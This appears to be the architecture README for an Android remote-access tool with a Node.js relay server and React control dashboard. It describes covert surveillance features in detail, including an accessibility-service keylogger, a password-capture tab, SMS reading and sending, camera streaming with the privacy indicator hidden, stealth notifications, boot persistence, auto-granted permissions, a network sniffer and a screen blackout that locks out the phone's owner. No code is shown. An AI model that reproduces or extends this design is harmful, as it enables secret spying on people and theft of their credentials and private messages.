# Remote Access Control Panel

## Architecture

A two-component remote device management system:

- **`app/`** — Android client (Java). Maintains a persistent TCP connection to the backend, executes remote commands, and streams live screen data.
- **`backend/`** — Node.js/Express server (port 5000). Relays messages between Android devices (TCP on port 6000) and the dashboard (WebSocket on `/ws`). Uses MongoDB for optional persistence. Also builds and serves the React dashboard as static files from `backend/public/`.
- **`react-dashboard/`** — React + Vite source files. Built by backend's `npm run build` into `backend/public/` via `backend/vite.config.mjs`. No separate package.json.
- **`frp/`** — Fast Reverse Proxy configs for NAT traversal.

## Workflows

- **Backend Server** — `cd backend && npm install --prefer-offline && npm run build && node server.js`
  - Installs all dependencies (backend + React/Vite), builds the React dashboard into `backend/public/`, then starts the server on port 5000.
  - React dashboard is served as static files by Express at port 5000.
  - No separate React Dashboard workflow needed.

## Package Structure

- `backend/package.json` — Merged package containing all backend dependencies (express, ws, mongoose, etc.) AND all React/Vite dependencies (react, react-dom, vite, @vitejs/plugin-react).
- `backend/vite.config.mjs` — Vite config; root points to `../react-dashboard`, outDir to `backend/public/`.

## React Dashboard Components

| File | Role |
|------|------|
| `App.jsx` | Root state, WebSocket events, device/command state |
| `Sidebar.jsx` | Collapsible device list with online/offline status |
| `StatusBar.jsx` | Server connection indicator |
| `GestureTab.jsx` | Gesture record/replay — list, SVG preview, record form, replay/delete. 5 pattern size presets (Large/Normal/Medium/Small/Mini) for different screen sizes |
| `FileManagerTab.jsx` | File manager — browse device filesystem, download files (base64 transfer), delete single or bulk files, quick-path shortcuts, sort/search |
| `Overview.jsx` | Dashboard home with stats and activity log |
| `DeviceControl.jsx` | Per-device control with 13 tabs (added Camera Monitor) |
| `TaskStudio.jsx` | Workflow automation builder — create/save/run step sequences (Open App, Click Text, Paste Text, Close App, Delay); steps are reorderable, saveable to localStorage, with live run log |
| `PasswordsTab.jsx` | Password capture tab — auto-detects password-like entries from keylogger push stream, reveals/hides values, copy to clipboard, sort by time or app |
| `CommandPanel.jsx` | All remote commands organized into categories |
| `ResultPanel.jsx` | Shows command results with image/audio rendering |
| `ScreenControl.jsx` | Live stream in phone frame + Block Screen (stops stream + disables controls while blocked, prominent unblock button, dedicated unblock message) + recording |
| `CameraMonitorTab.jsx` | Camera control tab — live JPEG stream from front/back camera, start/stop MP4 recording, recordings list with download/delete, camera privacy dot hidden via overlay window |
| `PermissionsTab.jsx` | Shows all app permissions (granted/denied), with per-permission request buttons + Special Permissions section (Battery, Overlay, Usage Stats, Write Settings) |
| `ScreenReaderView.jsx` | Streaming UI tree viewer with visual phone frame overlay |
| `KeyloggerTab.jsx` | Live keylog feed + per-day file download |
| `AppManager.jsx` | App grid with open/stop/clear/disable/uninstall actions |
| `AppMonitorTab.jsx` | Per-app keylogs + screenshot viewer for monitored packages |
| `ParamModal.jsx` | Parameter input modal for commands requiring args |
| `utils/reportGenerator.js` | Generates HTML reports from command results |

## Command Categories (CommandPanel)

- **System**: ping, device info, battery, network, wifi, installed apps
- **Location**: GPS location
- **Device**: vibrate, sound, clipboard get/set
- **SMS**: read, search, send, delete
- **Contacts**: list, search
- **Calls**: all logs, stats, by type, by number
- **Camera**: list cameras, take photo, screenshot
- **Audio**: record, stop, status, list recordings, get audio (base64), delete recording
- **Files**: list, read, write, copy, move, create directory, search, info, delete
- **Keylog**: get/clear keylogs, list files, download by date
- **App Monitor**: list monitored apps, get app keylogs, list/download screenshots
- **App Manager**: uninstall, force stop, open, clear data, disable
- **Notifications**: all, by app, clear
- **Screen Ctrl**: gestures, navigation, text input (requires accessibility service)
- **Screen Read**: UI tree dump, element search, streaming mode
- **Screen Blackout**: `screen_blackout_on` / `screen_blackout_off` — blacks out device screen while dashboard keeps streaming
- **Permissions**: `get_permissions`, `request_permission`, `request_all_permissions` — query and request runtime permissions
- **Social Media**: quick access to WhatsApp/Instagram/Twitter/Facebook/Telegram/Snapchat/TikTok notifications

## Android Features

- **KeyloggerService** — Instance-based utility; per-day JSONL files in hidden internal storage (`/data/data/<pkg>/files/.kl/YYYY-MM-DD.jsonl`); auto-enabled when accessibility service connects
- **AppMonitor** — Per-monitored-app keylogs + screenshots stored offline under `.am/<pkg>/`; configured via `Constants.MONITORED_PACKAGES`
- **UnifiedAccessibilityService** — Hooks `onTextChanged` and `onAppForeground` events to feed both KeyloggerService and AppMonitor
- **SocketManager** — Routes all keylogger/app-monitor/app-manager commands; exposes `getKeylogger()` and `getAppMonitor()` accessors
- **ScreenBlackout** — WindowManager TYPE_APPLICATION_OVERLAY overlay that blacks out the physical device screen; OnTouchListener consuming ALL touch events so device user cannot interact at all; race condition fixed with explicit locking and wait-for-attach/remove synchronization; streaming briefly hides the overlay before each frame so the dashboard sees real content (dashboard streaming disabled when block is active)
- **PermissionManager** — Queries and requests all app runtime permissions; opens Settings for Accessibility, Overlay, or App Details as needed

## Android App Capabilities

The Android client supports all commands listed above plus:
- Live screen streaming (MJPEG frames over WebSocket)
- **Screen Blackout**: blacks out device screen while dashboard streams real content (requires SYSTEM_ALERT_WINDOW)
- Auto-grant permissions via Accessibility Service
- Keylogger via Accessibility Service
- Notification interception for all apps
- Boot persistence via BootReceiver
- Stealth features (CameraIndicatorBypass, SilentNotificationManager)
- Network sniffer (NetworkSniffer.java — autonomous, no command interface)
- Social media notification monitoring (SocialMediaMonitor.java)

## Accessibility Module (Merged)

The standalone accessibility service from `accessibility-apk/` has been merged into the main app as a separate process. Files are in `app/src/main/java/com/remoteaccess/educational/accessibility/`:
- **StandaloneAccessibilityService** — Accessibility service running in `:standalone` process; survives main process crashes
- **SocketService** — Foreground service maintaining the TCP connection for the standalone process
- **SocketClient** — Lightweight socket client reading server URL/deviceId from SharedPreferences
- **ConfigActivity** — Minimal activity to configure server URL and open Accessibility Settings
- **BootReceiver** — (merged into main BootReceiver) starts both services on boot

The main app's BootReceiver now starts both `RemoteAccessService` and the standalone `SocketService` on boot/reinstall.

Two accessibility services are declared in the manifest:
- `.services.UnifiedAccessibilityService` — main process, full feature set
- `.accessibility.StandaloneAccessibilityService` — `:standalone` process, resilient fallback

Resource: `res/xml/accessibility_service_config_standalone.xml`

## 3G / Low-Network Latency Optimizations (Applied)

### Android (`app/src/main/java/…/network/SocketManager.java`)
- **Per-channel send locks** (`primaryLock`, `streamLock`, `liveLock`) — eliminated the shared `synchronized(this)` that caused 100 000+ ms device latency. A slow JPEG write on the stream channel no longer blocks the command or live channel.
- **`streamWriteBusy` AtomicBoolean** — drops new frames when the previous frame write is still blocking in the kernel (3G back-pressure). Prevents unbounded TCP buffer queuing.
- **Live-channel pong + stream-channel pong** use their channel lock to prevent output corruption from concurrent writes.
- **`pushKeylogEntry` / `pushNotification` / `pushRecentActivity`** now use the general cached `executor` instead of `liveExecutor`. The `liveExecutor` single thread is permanently occupied by `liveChannelLoop`'s blocking `readLine()` — tasks submitted to it were silently queued forever.
- **`scheduleAtFixedRate` → `scheduleWithFixedDelay`** for idle-frame and block-frame modes — waits for the previous frame write to complete before scheduling the next one. Prevents cascading frame backlog on slow links.

### Backend (`backend/server.js`)
- **`compression` middleware** (gzip, level 6) added for all HTTP responses; SSE streams are explicitly excluded.
- **JSON body limit** reduced from 50 MB to 20 MB.
- **Static asset caching** (1 h max-age) added.
- **TCP server** — `allowHalfOpen: false`, `setKeepAlive(true, 15000)`, `setRecvBufferSize(262144)` (256 KB) for burst tolerance.
- **Timing constants**: `PING_INTERVAL` 30 s → 20 s; `PONG_TIMEOUT` 120 s → 90 s; `CMD_TIMEOUT_MS` 60 s → 45 s.

## Build

Android build output: `app/build/outputs/apk/debug/app-debug.apk`
Build config: `settings.gradle`, `gradle.properties`, `local.properties`, `gradle/wrapper/gradle-wrapper.properties`
Requires: Android SDK (platform-tools, platforms;android-36, build-tools;35.0.0), Zulu JDK 17, Gradle 8.7
Run `bash build.sh` to build — produces a single unified APK at `apk-output/RemoteAccess-debug.apk`
